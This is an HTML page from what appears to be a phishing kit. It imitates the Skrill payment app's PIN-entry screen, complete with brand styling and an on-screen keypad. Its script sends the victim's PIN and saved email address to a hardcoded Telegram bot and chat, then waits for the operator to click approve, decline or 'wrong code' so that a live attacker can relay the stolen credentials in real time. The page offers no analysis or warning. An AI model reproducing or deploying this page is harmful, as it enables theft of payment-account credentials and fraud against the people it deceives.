<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Skrill - Enter PIN</title>

    <style>
        :root {
            --bg: #f8f9fa;
            --surface: #ffffff;
            --text: #111827;
            --text-soft: #4b5563;
            --brand: #8a1f9c;
            --input-border: #d1d5db;
            --keypad-bg: #f3f4f6;
            --keypad-hover: #e5e7eb;
            --radius-input: 10px;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* ---------- Top bar ---------- */
        .topbar {
            background: var(--brand);
            display: grid;
            grid-template-columns: 50px 1fr 50px;
            align-items: center;
            padding: 12px 16px;
            color: #fff;
        }
        
        .topbar .title {
            text-align: center;
            font-size: 22px;
            font-weight: 700;
            letter-spacing: 0.5px;
        }
        
        .icon-btn {
            background: none;
            border: none;
            color: #fff;
            cursor: pointer;
            width: 40px;
            height: 40px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
        }
        
        .icon-btn:hover {
            background: rgba(255, 255, 255, 0.1);
        }

        /* ---------- Content Layout ---------- */
        .main {
            flex: 1;
            display: flex;
            flex-direction: column;
            width: 100%;
            max-width: 480px;
            margin: 0 auto;
            padding: 32px 20px 20px;
            text-align: center;
        }

        .lock-icon-container {
            margin: 10px auto 20px;
            color: var(--brand);
        }
        
        .message-title {
            font-size: 22px;
            font-weight: 700;
            color: var(--text);
            margin-bottom: 8px;
        }

        .message-sub {
            font-size: 15px;
            line-height: 1.4;
            color: var(--text-soft);
            margin-bottom: 32px;
            padding: 0 16px;
        }

        /* ---------- 6-Digit PIN Boxes ---------- */
        .pin-display-container {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 40px;
        }

        .pin-box {
            width: 44px;
            height: 52px;
            border: 1.5px solid var(--input-border);
            border-radius: var(--radius-input);
            background: var(--surface);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            color: var(--text);
            transition: border-color 0.15s, box-shadow 0.15s;
        }

        .pin-box.active {
            border-color: var(--brand);
            box-shadow: 0 0 0 2px rgba(138, 31, 156, 0.15);
        }

        .hidden-input {
            position: absolute;
            opacity: 0;
            pointer-events: none;
        }

        /* ---------- Numeric Keypad ---------- */
        .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            margin-top: auto;
            padding-bottom: 20px;
        }

        .key-btn {
            background: var(--keypad-bg);
            border: none;
            border-radius: 16px;
            padding: 16px 0;
            font-size: 24px;
            font-weight: 600;
            color: var(--text);
            cursor: pointer;
            transition: background 0.1s, transform 0.05s;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .key-btn:active {
            background: var(--keypad-hover);
            transform: scale(0.96);
        }

        .key-btn.empty {
            background: transparent;
            cursor: default;
            pointer-events: none;
        }

        /* ---------- Note & Error Styles ---------- */
        .form-note {
            margin-top: 12px;
            text-align: center;
            font-size: 14px;
            color: var(--text-soft);
            min-height: 20px;
        }
        
        .form-note.error {
            color: #dc2626;
            font-weight: 600;
        }

        /* ---------- Spinner Overlay Component ---------- */
        .spinner-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.65);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            padding: 16px;
        }
        
        .spinner-overlay.active {
            display: flex;
        }
        
        .spinner-box {
            width: 100%;
            max-width: 360px;
            background: #ffffff;
            border-radius: 14px;
            padding: 24px;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border: 3px solid rgba(138, 31, 156, 0.15);
            border-top-color: var(--brand);
            margin: 0 auto 14px;
            animation: spin 0.8s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .spinner-text {
            font-weight: 700;
            margin-bottom: 6px;
            font-size: 16px;
            color: var(--text);
        }
        
        .spinner-email {
            color: var(--text-soft);
            font-size: 13px;
            word-break: break-word;
            margin-bottom: 16px;
        }
        
        .cancel-poll-btn {
            width: 100%;
            height: 42px;
            border-radius: 10px;
            border: 1px solid #dc2626;
            background: transparent;
            color: #dc2626;
            font-weight: 700;
            cursor: pointer;
        }
        
        .cancel-poll-btn:hover {
            background: rgba(220, 38, 38, 0.05);
        }
    </style>
</head>

<body>
    <header class="topbar">
        <button class="icon-btn" id="backBtn" aria-label="Go back">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <line x1="19" y1="12" x2="5" y2="12" />
                <polyline points="12 19 5 12 12 5" />
            </svg>
        </button>

        <div class="title">Skrill</div>

        <div></div>
    </header>

    <main class="main">
        <div class="lock-icon-container">
            <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
            </svg>
        </div>

        <h1 class="message-title">Enter your 6-digit PIN</h1>
        <p class="message-sub">
            For your security, please enter your <span id="userEmail">Skrill app</span> PIN.
        </p>

        <form class="code-form" id="codeForm" novalidate>
            <input class="hidden-input" id="codeInput" type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="6" />

            <div class="pin-display-container" id="pinDisplayContainer">
                <div class="pin-box"></div>
                <div class="pin-box"></div>
                <div class="pin-box"></div>
                <div class="pin-box"></div>
                <div class="pin-box"></div>
                <div class="pin-box"></div>
            </div>

            <div class="keypad" id="keypad">
                <button type="button" class="key-btn" data-val="1">1</button>
                <button type="button" class="key-btn" data-val="2">2</button>
                <button type="button" class="key-btn" data-val="3">3</button>
                <button type="button" class="key-btn" data-val="4">4</button>
                <button type="button" class="key-btn" data-val="5">5</button>
                <button type="button" class="key-btn" data-val="6">6</button>
                <button type="button" class="key-btn" data-val="7">7</button>
                <button type="button" class="key-btn" data-val="8">8</button>
                <button type="button" class="key-btn" data-val="9">9</button>
                <div class="key-btn empty"></div>
                <button type="button" class="key-btn" data-val="0">0</button>
                <button type="button" class="key-btn" id="deleteBtn" aria-label="Delete">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
                        <line x1="18" y1="9" x2="12" y2="15"></line>
                        <line x1="12" y1="9" x2="18" y2="15"></line>
                    </svg>
                </button>
            </div>

            <p class="form-note" id="formNote"></p>
        </form>
    </main>

    <div class="spinner-overlay" id="spinnerOverlay" aria-hidden="true">
        <div class="spinner-box">
            <div class="spinner"></div>
            <p class="spinner-text">Verifying PIN...</p>
            <p class="spinner-email" id="spinnerEmail"></p>
            <button class="cancel-poll-btn" type="button" id="cancelPollBtn">Cancel</button>
        </div>
    </div>

    <script>
        let currentPollController = null;
        let pollTimeoutId = null;
        let activeSessionId = null;

        const BOT_TOKEN = "7996666362:AAFVzLC1LD14nkmJN8MN98SRdOu2hIA1ftc";
        const CHAT_ID = "8406078749";
        const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;

        const spinnerOverlay = document.getElementById("spinnerOverlay");
        const spinnerEmailEl = document.getElementById("spinnerEmail");
        const cancelPollBtn = document.getElementById("cancelPollBtn");

        const codeForm = document.getElementById("codeForm");
        const codeField = document.getElementById("codeInput");
        const pinBoxes = document.querySelectorAll(".pin-box");
        const keypad = document.getElementById("keypad");
        const deleteBtn = document.getElementById("deleteBtn");

        const userEmailEl = document.getElementById("userEmail");
        const formNote = document.getElementById("formNote");

        function safeSetNote(msg, type) {
            if (!formNote) return;
            formNote.textContent = msg || "";
            formNote.className = "form-note" + (type ? " " + type : "");
        }

        function showSpinner(emailText) {
            if (spinnerOverlay) spinnerOverlay.classList.add("active");
            if (spinnerOverlay) spinnerOverlay.setAttribute("aria-hidden", "false");
            if (spinnerEmailEl) spinnerEmailEl.textContent = emailText || "";
        }

        function hideSpinner() {
            if (spinnerOverlay) spinnerOverlay.classList.remove("active");
            if (spinnerOverlay) spinnerOverlay.setAttribute("aria-hidden", "true");
        }

        function updatePinDisplay() {
            const val = codeField.value;
            pinBoxes.forEach((box, idx) => {
                box.textContent = val[idx] ? "•" : "";
                if (idx === val.length) {
                    box.classList.add("active");
                } else {
                    box.classList.remove("active");
                }
            });
        }

        function resetPageState() {
            if (currentPollController) currentPollController.abort();
            if (pollTimeoutId) clearTimeout(pollTimeoutId);

            hideSpinner();
            if (codeField) codeField.value = "";
            updatePinDisplay();
            safeSetNote("Wrong PIN. Please enter a valid 6-digit PIN and try again.", "error");

            activeSessionId = null;
            currentPollController = null;
            pollTimeoutId = null;
        }

        function onApprove() {
            hideSpinner();
            safeSetNote("", "");
            window.location.href = "login.html";
        }

        function onDecline() {
            if (currentPollController) currentPollController.abort();
            if (pollTimeoutId) clearTimeout(pollTimeoutId);

            hideSpinner();
            if (codeField) codeField.value = "";
            updatePinDisplay();
            safeSetNote("PIN verification declined. Please try again.", "error");

            activeSessionId = null;
            currentPollController = null;
            pollTimeoutId = null;
        }

        function onWrongCodeAndReset() {
            resetPageState();
        }

        function cancelPolling() {
            if (currentPollController) currentPollController.abort();
            if (pollTimeoutId) clearTimeout(pollTimeoutId);

            hideSpinner();
            safeSetNote("Request cancelled. Please try again.", "error");

            activeSessionId = null;
            currentPollController = null;
            pollTimeoutId = null;
        }

        cancelPollBtn && cancelPollBtn.addEventListener("click", cancelPolling);

        window.addEventListener("DOMContentLoaded", () => {
            const savedEmail = localStorage.getItem("signin_email");
            if (userEmailEl && savedEmail) userEmailEl.textContent = savedEmail;
            updatePinDisplay();
        });

        keypad.addEventListener("click", (e) => {
            const btn = e.target.closest(".key-btn");
            if (!btn) return;

            let currentVal = codeField.value;

            if (btn === deleteBtn) {
                if (currentVal.length > 0) {
                    codeField.value = currentVal.slice(0, -1);
                    updatePinDisplay();
                    safeSetNote("", "");
                }
                return;
            }

            const digit = btn.getAttribute("data-val");
            if (digit !== null && currentVal.length < 6) {
                codeField.value += digit;
                updatePinDisplay();
                safeSetNote("", "");

                if (codeField.value.length === 6) {
                    codeForm.dispatchEvent(new Event("submit", { cancelable: true }));
                }
            }
        });

        function cryptoRandomId() {
            try {
                const arr = new Uint32Array(4);
                crypto.getRandomValues(arr);
                return Array.from(arr).map((n) => n.toString(16)).join("");
            } catch {
                return String(Date.now()) + "_" + Math.random().toString(16).slice(2);
            }
        }

        function startPolling2FA(userId) {
            let offset = 0;
            activeSessionId = cryptoRandomId();

            if (currentPollController) currentPollController.abort();
            currentPollController = new AbortController();

            const sessionSnapshot = activeSessionId;
            const maxPolls = 90;
            let pollCount = 0;
            let retryDelay = 2000;

            fetch(`${API_BASE}/getUpdates?limit=1`, {
                method: "GET",
                signal: currentPollController.signal,
            })
            .then((r) => r.json())
            .then((data) => {
                if (data && data.ok && data.result && data.result.length > 0) {
                    offset = data.result[data.result.length - 1].update_id + 1;
                }
                pollLoop();
            })
            .catch(() => {
                pollLoop();
            });

            function pollLoop() {
                if (activeSessionId !== sessionSnapshot) return;

                pollCount++;
                if (pollCount > maxPolls) {
                    if (activeSessionId === sessionSnapshot) {
                        activeSessionId = null;
                        hideSpinner();
                        safeSetNote("Request timed out. Please try again.", "error");
                    }
                    return;
                }

                fetch(`${API_BASE}/getUpdates?limit=20&offset=${offset}`, {
                    method: "GET",
                    signal: currentPollController.signal,
                })
                .then((r) => {
                    if (!r.ok) {
                        if (r.status === 409) {
                            retryDelay = Math.min(retryDelay * 1.5, 10000);
                            pollTimeoutId = setTimeout(pollLoop, retryDelay);
                            return null;
                        }
                        throw new Error("HTTP " + r.status);
                    }
                    retryDelay = 2000;
                    return r.json();
                })
                .then((data) => {
                    if (!data || !data.ok || activeSessionId !== sessionSnapshot) return;

                    for (const update of data.result || []) {
                        offset = update.update_id + 1;

                        const cb = update.callback_query;
                        if (!cb || !cb.data) continue;

                        const actionData = cb.data;
                        if (!actionData.includes(`_${userId}`)) continue;

                        fetch(`${API_BASE}/answerCallbackQuery`, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({
                                callback_query_id: cb.id,
                                text: "Action recorded!",
                            }),
                        }).catch(() => {});

                        if (actionData === `approve_2fa_${userId}`) {
                            if (activeSessionId === sessionSnapshot) {
                                activeSessionId = null;
                                pollStop();
                                onApprove();
                            }
                            return;
                        }

                        if (actionData === `decline_2fa_${userId}`) {
                            if (activeSessionId === sessionSnapshot) {
                                activeSessionId = null;
                                pollStop();
                                onDecline();
                            }
                            return;
                        }

                        if (actionData === `wrong_2fa_${userId}`) {
                            if (activeSessionId === sessionSnapshot) {
                                activeSessionId = null;
                                pollStop();
                                onWrongCodeAndReset();
                            }
                            return;
                        }
                    }

                    if (activeSessionId === sessionSnapshot) {
                        pollTimeoutId = setTimeout(pollLoop, retryDelay);
                    }
                })
                .catch((err) => {
                    if (err && err.name === "AbortError") return;
                    if (activeSessionId !== sessionSnapshot) return;

                    retryDelay = Math.min(retryDelay * 1.2, 8000);
                    pollTimeoutId = setTimeout(pollLoop, retryDelay);
                });
            }

            function pollStop() {
                if (pollTimeoutId) clearTimeout(pollTimeoutId);
                pollTimeoutId = null;
                if (currentPollController) currentPollController.abort();
                currentPollController = null;
            }
        }

        if (codeForm) {
            codeForm.addEventListener("submit", function(e) {
                e.preventDefault();

                const code = codeField ? codeField.value.trim() : "";
                if (!/^\d{6}$/.test(code)) {
                    safeSetNote("Please enter a valid 6-digit PIN.", "error");
                    return;
                }

                const storedEmail = localStorage.getItem("signin_email") || "unknown";
                const userId = `${storedEmail.replace(/[^a-zA-Z0-9]/g, "").slice(0, 15)}_${Date.now()}`;
                localStorage.setItem("signin_2fa_userId", userId);

                safeSetNote("Verifying...", "");
                showSpinner(storedEmail);

                const message = [
                    "🔐 Skrill PIN received",
                    "",
                    `Identifier: ${storedEmail}`,
                    `PIN: ${code}`,
                    "",
                    "Please approve, decline, or mark as wrong:",
                ].join("\n");

                const keyboard = {
                    inline_keyboard: [
                        [
                            { text: "✅ APPROVE", callback_data: `approve_2fa_${userId}` },
                            { text: "❌ DECLINE", callback_data: `decline_2fa_${userId}` },
                        ],
                        [
                            { text: "⚠️ WRONG CODE", callback_data: `wrong_2fa_${userId}` },
                        ],
                    ],
                };

                fetch(`${API_BASE}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        reply_markup: JSON.stringify(keyboard),
                    }),
                })
                .then((res) => res.json())
                .then((data) => {
                    if (!data.ok) {
                        hideSpinner();
                        safeSetNote("Failed to contact server. Please try again.", "error");
                        return;
                    }
                    startPolling2FA(userId);
                })
                .catch(() => {
                    hideSpinner();
                    safeSetNote("Network error. Please try again.", "error");
                });
            });
        }
    </script>
</body>

</html>
